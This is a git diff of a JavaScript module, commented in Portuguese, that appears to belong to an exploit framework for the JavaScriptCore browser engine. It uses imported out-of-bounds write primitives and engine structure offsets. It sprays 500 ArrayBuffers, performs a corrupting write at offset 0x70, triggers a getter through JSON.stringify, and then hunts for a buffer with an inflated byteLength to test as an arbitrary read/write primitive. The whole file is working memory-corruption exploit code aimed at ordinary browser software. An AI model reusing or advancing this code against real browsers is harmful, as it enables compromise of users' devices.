@@ -9,193 +9,150 @@ import {
     oob_read_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs'; // Adicionado OOB_CONFIG
+import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';
 
 // ============================================================\n// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO\n// ============================================================
-const FNAME_SPRAY_AND_GETTER_CORRUPTION = "sprayGetterAndCheckCorruption_v14a";
+const FNAME_SPRAY_AB_AND_CHECK_SIZE = "sprayABAndCheckSizeCorruption_v15a";
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForPostCorruptionAnalysis"; // Pode ser simples
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSync";
 const CORRUPTION_OFFSET_TRIGGER = 0x70;
-const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
+const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // O que será escrito
 
-// Offsets para plantar dados no oob_array_buffer_real (para a hipótese de corromper ABView)
-const FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB = 0x50; 
-const ADV64_ZERO = new AdvancedInt64(0, 0);
-const TARGET_M_LENGTH_VALUE = 0xFFFFFFFF;
-
-const NUM_SPRAY_OBJECTS = 200; // Ou mais, ex: 500
-const ORIGINAL_SPRAY_LENGTH = 8;
-const SPRAY_ELEMENT_VAL_A = 0xCCCCCCCC; // Valores diferentes do teste anterior para clareza
-const SPRAY_ELEMENT_VAL_B = 0xDDDDDDDD;
+const NUM_SPRAY_AB_OBJECTS = 500; // Aumentar bastante o número de ArrayBuffers pulverizados
+const SPRAY_AB_SIZE = 128;      // Tamanho dos ArrayBuffers pulverizados (pode variar)
+const TARGET_CORRUPTED_SIZE = 0xFFFFFFFF; // Se o size for corrompido para isto
 
 // ============================================================\n// VARIÁVEIS GLOBAIS DE MÓDULO\n// ============================================================
-let sprayedVictimObjects = [];
-let originalSprayedValues = []; 
-let getter_sync_flag = false;
+let sprayedVictimABs = [];
+let getter_sync_flag_v15a = false;
 
 export async function sprayAndInvestigateObjectExposure() { // Mantendo nome da exportação
-    logS3(`--- Iniciando ${FNAME_SPRAY_AND_GETTER_CORRUPTION}: Spray, Trigger 0x70, Getter, Checar Corrupção Spray ---`, "test", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-    getter_sync_flag = false;
+    logS3(`--- Iniciando ${FNAME_SPRAY_AB_AND_CHECK_SIZE}: Spray ArrayBuffers, Trigger 0x70, Checar Corrupção de Tamanho ---`, "test", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+    getter_sync_flag_v15a = false;
 
     try {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real || !oob_dataview_real) {
-            logS3("Falha ao inicializar o ambiente OOB.", "critical", FNAME_SPRAY_AND_GETTER_CORRUPTION);
+            logS3("Falha ao inicializar o ambiente OOB.", "critical", FNAME_SPRAY_AB_AND_CHECK_SIZE);
             return;
         }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
+        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_AB_AND_CHECK_SIZE);
 
-        // FASE 1: Pulverizar objetos Uint32Array e guardar seus valores originais
-        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-        sprayedVictimObjects = [];
-        originalSprayedValues = [];
-        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
-            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
-            u32arr[0] = SPRAY_ELEMENT_VAL_A;
-            u32arr[1] = SPRAY_ELEMENT_VAL_B;
-            for (let j = 2; j < ORIGINAL_SPRAY_LENGTH; j++) { u32arr[j] = i; }
-            sprayedVictimObjects.push(u32arr);
-            originalSprayedValues.push(Array.from(u32arr));
+        // FASE 1: Pulverizar objetos ArrayBuffer
+        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_AB_OBJECTS} objetos ArrayBuffer(${SPRAY_AB_SIZE})...`, "info", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+        sprayedVictimABs = [];
+        for (let i = 0; i < NUM_SPRAY_AB_OBJECTS; i++) {
+            try {
+                const ab = new ArrayBuffer(SPRAY_AB_SIZE);
+                // Marcar o buffer para possível identificação (opcional)
+                if (SPRAY_AB_SIZE >= 4) new DataView(ab).setUint32(0, 0xDAF0DAF0 + i, true);
+                sprayedVictimABs.push(ab);
+            } catch (e) {
+                logS3(`Erro ao criar ArrayBuffer no spray, índice ${i}: ${e.message}`, "warn", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+                // Continuar mesmo que alguns falhem, mas logar.
+            }
         }
-        logS3("Pulverização concluída.", "good", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-        await PAUSE_S3(50);
+        logS3(`Pulverização de ${sprayedVictimABs.length} ArrayBuffers concluída.`, "good", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+        await PAUSE_S3(100); // Pausa maior para estabilização da heap
 
-        // FASE 2: Plantar valores no oob_array_buffer_real para a hipótese de corromper um ABView pulverizado
-        logS3(`FASE 2: Plantando m_vector=0, m_length=0xFFFFFFFF em oob_buffer para potencial corrupção de ABView...`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-        const targetMetaVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
-        const targetMetaLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
-        
-        oob_write_absolute(targetMetaVectorOffset, ADV64_ZERO, 8);
-        oob_write_absolute(targetMetaLengthOffset, TARGET_M_LENGTH_VALUE, 4);
-        logS3(`  Valores plantados em oob_buffer[${toHex(targetMetaVectorOffset)}] e oob_buffer[${toHex(targetMetaLengthOffset)}]`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-        
-        // Adicional: Plantar algo distinto em 0x6C para ver se o getter ainda o observa como antes
-        const val_for_0x6C = new AdvancedInt64(0x6C6C6C6C, 0x6C6C6C6C);
-        oob_write_absolute(0x6C, val_for_0x6C, 8);
-        logS3(`  Valor de teste ${val_for_0x6C.toString(true)} plantado em oob_buffer[0x6C].`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-        await PAUSE_S3(50);
 
-        // FASE 3: Configurar objeto com getter (o getter pode ser simples, apenas para sincronização ou log)
+        // FASE 2: Configurar objeto com getter (apenas para sincronização e log)
         const getterObject = {
             get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
-                logS3(`    >>>> [GETTER ${GETTER_CHECKPOINT_PROPERTY_NAME} ACIONADO!] <<<<`, "vuln", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-                getter_sync_flag = true;
-                // Opcional: Ler 0x6C aqui como no teste _v13a para ver se ainda é 0xFFFFFFFF_6C6C6C6C
-                try {
-                    const val_0x6C_in_getter = oob_read_absolute(0x6C, 8);
-                    logS3(`    [GETTER]: Valor em oob_buffer[0x6C]: ${val_0x6C_in_getter.toString(true)}`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-                } catch(e) {logS3(`    [GETTER]: Erro ao ler 0x6C: ${e.message}`, "warn", FNAME_SPRAY_AND_GETTER_CORRUPTION); }
+                logS3(`    >>>> [GETTER ${GETTER_CHECKPOINT_PROPERTY_NAME} ACIONADO!] <<<<`, "info", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+                getter_sync_flag_v15a = true;
                 return "GetterSyncValue";
             }
         };
 
-        // FASE 4: Realizar a escrita OOB (trigger)
-        logS3(`FASE 4: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
+        // FASE 3: Realizar a escrita OOB (trigger) no oob_array_buffer_real
+        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+        // NÃO estamos plantando m_vector/m_length aqui, pois o alvo da corrupção é um JSArrayBuffer pulverizado.
+        // A escrita em 0x70 é a única "preparação" no oob_array_buffer_real.
         oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
-        logS3("Escrita OOB de trigger realizada.", "good", FNAME_SPRAY_AND_GETTER_CORRUPTION);
+        logS3("Escrita OOB de trigger realizada.", "good", FNAME_SPRAY_AB_AND_CHECK_SIZE);
         await PAUSE_S3(100); 
 
-        // FASE 5: Chamar JSON.stringify para acionar o getter (e qualquer efeito colateral da corrupção + stringify)
-        logS3(`FASE 5: Chamando JSON.stringify para acionar o getter...`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
+        // FASE 4: Chamar JSON.stringify para acionar o getter (e qualquer efeito colateral da corrupção + stringify)
+        logS3(`FASE 4: Chamando JSON.stringify para acionar o getter...`, "info", FNAME_SPRAY_AB_AND_CHECK_SIZE);
         try {
             JSON.stringify(getterObject);
         } catch (e) {
-            logS3(`Erro durante JSON.stringify: ${e.message}`, "warn", FNAME_SPRAY_AND_GETTER_CORRUPTION);
+            logS3(`Erro durante JSON.stringify: ${e.message}`, "warn", FNAME_SPRAY_AB_AND_CHECK_SIZE);
         }
-        if (getter_sync_flag) {
-            logS3("  Getter foi acionado como esperado.", "good", FNAME_SPRAY_AND_GETTER_CORRUPTION);
+        if (getter_sync_flag_v15a) {
+            logS3("  Getter foi acionado como esperado.", "good", FNAME_SPRAY_AB_AND_CHECK_SIZE);
         } else {
-            logS3("  ALERTA: Getter NÃO foi acionado!", "error", FNAME_SPRAY_AND_GETTER_CORRUPTION);
+            logS3("  ALERTA: Getter NÃO foi acionado!", "error", FNAME_SPRAY_AB_AND_CHECK_SIZE);
         }
-        await PAUSE_S3(100); // Pausa adicional
+        await PAUSE_S3(200); // Pausa adicional para efeitos da corrupção se propagarem
 
-        // FASE 6: Verificar TODOS os arrays pulverizados por QUALQUER mudança
-        logS3(`FASE 6: Verificando ${NUM_SPRAY_OBJECTS} arrays pulverizados por corrupção...`, "info", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-        let corruptedArraysFound = 0;
-        let superArrayIndex = -1;
-        for (let i = 0; i < sprayedVictimObjects.length; i++) {
-            const currentArray = sprayedVictimObjects[i];
-            const originalValues = originalSprayedValues[i];
-            let isCorrupted = false;
-            let corruptionDetails = "";
+        // FASE 5: Verificar TODOS os ArrayBuffers pulverizados por mudança no byteLength
+        logS3(`FASE 5: Verificando ${sprayedVictimABs.length} ArrayBuffers pulverizados por corrupção no byteLength...`, "info", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+        let corruptedABsFound = 0;
+        let potentialSuperABIndex = -1;
+        for (let i = 0; i < sprayedVictimABs.length; i++) {
+            const currentAB = sprayedVictimABs[i];
+            if (!currentAB) continue;
 
-            if (!currentArray) { // Segurança
-                logS3(`Array pulverizado índice [${i}] é null/undefined.`, "warn", FNAME_SPRAY_AND_GETTER_CORRUPTION);
+            let currentLength = 0;
+            try {
+                currentLength = currentAB.byteLength;
+            } catch (e) {
+                logS3(`    Erro ao acessar byteLength do ArrayBuffer pulverizado índice [${i}]: ${e.message}`, "warn", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+                // Considerar este como potencialmente corrompido se o acesso falhar.
+                document.title = `CORRUPÇÃO AB SPRAY (ERRO BL) Idx ${i}!`;
+                corruptedABsFound++;
                 continue;
             }
 
-            if (currentArray.length !== ORIGINAL_SPRAY_LENGTH) {
-                isCorrupted = true;
-                corruptionDetails += ` Length alterado de ${ORIGINAL_SPRAY_LENGTH} para ${currentArray.length}.`;
-                if (currentArray.length === TARGET_M_LENGTH_VALUE) {
-                    corruptionDetails += " (POTENCIAL SUPER ARRAY LENGTH!)";
-                    superArrayIndex = i; // Marcar se encontramos o length desejado
-                }
-            }
-            
-            const checkableLength = Math.min(ORIGINAL_SPRAY_LENGTH, currentArray.length); // Evitar ler fora dos novos limites se encolher
-            for (let j = 0; j < ORIGINAL_SPRAY_LENGTH; j++) { 
-                let currentValue;
-                let originalValue = originalValues[j];
-                if (j < currentArray.length) { // Só ler se dentro dos novos limites
+            if (currentLength !== SPRAY_AB_SIZE) {
+                logS3(`    !!! CORRUPÇÃO DE TAMANHO DETECTADA no ArrayBuffer pulverizado índice [${i}] !!!`, "vuln", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+                logS3(`      byteLength alterado de ${SPRAY_AB_SIZE} para ${currentLength} (${toHex(currentLength)})`, "vuln", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+                corruptedABsFound++;
+                document.title = `CORRUPÇÃO AB SPRAY (${corruptedABsFound})!`;
+
+                if (currentLength === TARGET_CORRUPTED_SIZE || currentLength > 0x10000000) { // 0x10000000 == 256MB
+                    logS3(`      POTENCIAL SUPER ArrayBuffer encontrado! byteLength: ${toHex(currentLength)}`, "vuln", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+                    potentialSuperABIndex = i;
+                    // Tentar usar este ArrayBuffer para OOB
                     try {
-                        currentValue = currentArray[j];
-                    } catch (e) {
-                        isCorrupted = true;
-                        corruptionDetails += ` Erro ao ler elemento [${j}]: ${e.message}.`;
-                        currentValue = undefined; // Marcar como indefinido para comparação
-                    }
-                } else { // j está além do novo currentArray.length
-                    currentValue = undefined; // Marcar como indefinido
-                    if(isCorrupted && currentArray.length < ORIGINAL_SPRAY_LENGTH) { // Se o array encolheu
-                         corruptionDetails += ` Elemento original [${j}] (${toHex(originalValue)}) inacessível (novo length: ${currentArray.length}).`;
+                        const dv = new DataView(currentAB);
+                        // Tentar ler/escrever em um offset grande, mas seguro dentro do esperado TARGET_CORRUPTED_SIZE
+                        const testOffset = 0x1000; // Um offset para teste
+                        const testRead = dv.getUint32(testOffset, true);
+                        logS3(`      Leitura de teste do Super AB @${toHex(testOffset)}: ${toHex(testRead)}`, "leak", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+                        dv.setUint32(testOffset, 0xFEEDBEEF, true);
+                        const testReadAfterWrite = dv.getUint32(testOffset, true);
+                        if (testReadAfterWrite === 0xFEEDBEEF) {
+                            logS3(`      SUCESSO: Escrita/Leitura no Super AB @${toHex(testOffset)} funcionou!`, "vuln", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+                            document.title = `SUPER AB FUNCIONAL Idx ${i}!`;
+                        } else {
+                            logS3(`      FALHA: Escrita/Leitura no Super AB @${toHex(testOffset)} falhou. Lido: ${toHex(testReadAfterWrite)}`, "error", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+                        }
+                    } catch (e_dv) {
+                        logS3(`      Erro ao tentar usar DataView no ArrayBuffer corrompido: ${e_dv.message}`, "error", FNAME_SPRAY_AB_AND_CHECK_SIZE);
                     }
                 }
-
-                if (currentValue !== originalValue) {
-                     if (!(j >= currentArray.length && currentValue === undefined)) { // Não logar como mudança se apenas ficou inacessível E já logado
-                        isCorrupted = true;
-                        corruptionDetails += ` Elem [${j}] de ${toHex(originalValue)} para ${j < currentArray.length ? toHex(currentValue) : 'inacessível'}.`;
-                     }
-                }
-            }
-            
-            if (isCorrupted) {
-                logS3(`    !!! CORRUPÇÃO DETECTADA no array pulverizado índice [${i}] !!!`, "vuln", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-                logS3(`      Detalhes: ${corruptionDetails}`, "vuln", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-                corruptedArraysFound++;
-                document.title = `CORRUPÇÃO SPRAY (${corruptedArraysFound})!`;
             }
         }
 
-        if (corruptedArraysFound > 0) {
-            logS3(`  Total de ${corruptedArraysFound} arrays pulverizados encontrados com alguma corrupção.`, "good", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-            if (superArrayIndex !== -1) {
-                logS3(`    POTENCIAL SUPER ARRAY (pelo length) encontrado no índice: ${superArrayIndex}`, "vuln", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-                document.title = `SUPER ARRAY? Idx ${superArrayIndex}`;
-                // Tentar usar o superArray[superArrayIndex] aqui para ler 0x0 se desejar
-                const sa = sprayedVictimObjects[superArrayIndex];
-                try {
-                    logS3(`Tentando ler superArray[${superArrayIndex}][0]: ${toHex(sa[0])}`, "leak", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-                } catch (e) {
-                    logS3(`Erro ao ler superArray[${superArrayIndex}][0]: ${e.message}`, "error", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-                }
-            }
+        if (corruptedABsFound > 0) {
+            logS3(`  Total de ${corruptedABsFound} ArrayBuffers pulverizados encontrados com corrupção de tamanho.`, "good", FNAME_SPRAY_AB_AND_CHECK_SIZE);
         } else {
-            logS3("  Nenhuma corrupção detectada nos arrays pulverizados.", "warn", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-            document.title = "Nenhuma Corrupção Spray";
+            logS3("  Nenhuma corrupção de tamanho detectada nos ArrayBuffers pulverizados.", "warn", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+            document.title = "Nenhuma Corrupção AB Spray";
         }
 
-        logS3("INVESTIGAÇÃO DE CORRUPÇÃO EM SPRAY PÓS-GETTER CONCLUÍDA.", "test", FNAME_SPRAY_AND_GETTER_CORRUPTION);
+        logS3("INVESTIGAÇÃO DE CORRUPÇÃO DE TAMANHO DE ArrayBuffer CONCLUÍDA.", "test", FNAME_SPRAY_AB_AND_CHECK_SIZE);
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO em ${FNAME_SPRAY_AND_GETTER_CORRUPTION}: ${e.message}`, "critical", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_AND_GETTER_CORRUPTION);
-        document.title = `${FNAME_SPRAY_AND_GETTER_CORRUPTION} FALHOU!`;
+        logS3(`ERRO CRÍTICO em ${FNAME_SPRAY_AB_AND_CHECK_SIZE}: ${e.message}`, "critical", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_AB_AND_CHECK_SIZE);
+        document.title = `${FNAME_SPRAY_AB_AND_CHECK_SIZE} FALHOU!`;
     } finally {
-        sprayedVictimObjects = [];
-        originalSprayedValues = [];
+        sprayedVictimABs = []; // Limpar array
         clearOOBEnvironment();
-        logS3(`--- ${FNAME_SPRAY_AND_GETTER_CORRUPTION} Concluído ---`, "test", FNAME_SPRAY_AND_GETTER_CORRUPTION);
+        logS3(`--- ${FNAME_SPRAY_AB_AND_CHECK_SIZE} Concluído ---`, "test", FNAME_SPRAY_AB_AND_CHECK_SIZE);
     }
 }
